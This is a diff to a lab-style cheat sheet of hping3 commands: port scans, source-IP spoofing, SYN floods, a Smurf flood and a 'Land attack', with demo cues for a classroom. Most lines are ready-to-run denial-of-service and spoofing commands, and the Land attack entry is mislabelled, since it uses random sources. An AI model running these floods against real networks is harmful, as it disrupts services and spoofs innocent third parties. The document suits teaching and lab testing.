@@ -1,11 +1,11 @@
 TCP scan: 
-hping3 -V --scan  1-100 -S <IP>
+$ hping3 -V --scan  1-100 -S <IP>
 -V      - verbose
 --scan  - scan mode
 -S      - set SYN flag
 
 Lets SPOOF an address:
-hping3  -I eth5  -a 1.2.3.4  -p 80  -S   -c 10  <IP>
+$ hping3  -I eth5  -a 1.2.3.4  -p 80  -S   -c 10  <IP>
 -I    - Interface name
 -a    - spoof source IP
 -p    - base source PORT
@@ -13,36 +13,36 @@ hping3  -I eth5  -a 1.2.3.4  -p 80  -S   -c 10  <IP>
 
 
 Do a SYN flood with random source addresses:
-hping3  --flood  --rand-source   -p 80  -S <IP>
+$ hping3  --flood  --rand-source   -p 80  -S <IP>
 --flood       - send packets as fast as possible
 --rand-source - random source IP
 
 
 Do sequence number prediction:
-hping3  <IP> --seqnum  -p 139  -S  -i u1  -I eth5
+$ hping3  <IP> --seqnum  -p 139  -S  -i u1  -I eth5
 --seqnum  - shows only tcp sequence number
 -i        - interval [uX for x microseconds]
 
 
 Do an ICMP ping:
-hping3  -1  <IP>
+$ hping3  -1  <IP>
 -1  - ICMP mode [--icmp]
 
 
 Do an ACK scan:
-hping3  -A  <IP>  -p 80
+$ hping3  -A  <IP>  -p 80
 -A  - ACK flag set
 
 
 Do an XMAS attack:
-hping3  -F  -P  -U  <IP>  -p 80
+$ hping3  -F  -P  -U  <IP>  -p 80
 -F  - set FIN flag
 -P  - set PUSH flag
 -U  - set URG flag
 
 
 Smurf attack: [run with wireshark to see the flooded traffic]
-hping3  -1  --flood  -a  <IP> <SUBNET>
+$ hping3  -1  --flood  -a  <IP> <SUBNET>
 -1      - ICMP mode
 --flood - flood packets as fast as possible
 -a      - spoof source IP
@@ -50,7 +50,7 @@ hping3  -1  --flood  -a  <IP> <SUBNET>
 
 Do a Land attack: [bring up task manager and show the performance tab with the cpu]
 [this should send  -d (data size)  120  with a count of 1000000  syn packets, with 445 as the destination and the source.]
-hping3  -V  -c 1000000  -d 120  -S  -w 64  -p 445  -s 445  --flood  --rand-source  <IP> 
+$ hping3  -V  -c 1000000  -d 120  -S  -w 64  -p 445  -s 445  --flood  --rand-source  <IP> 
 -c    - packet count
 -d    - data size
 -w    - use Win* ID byte ordering
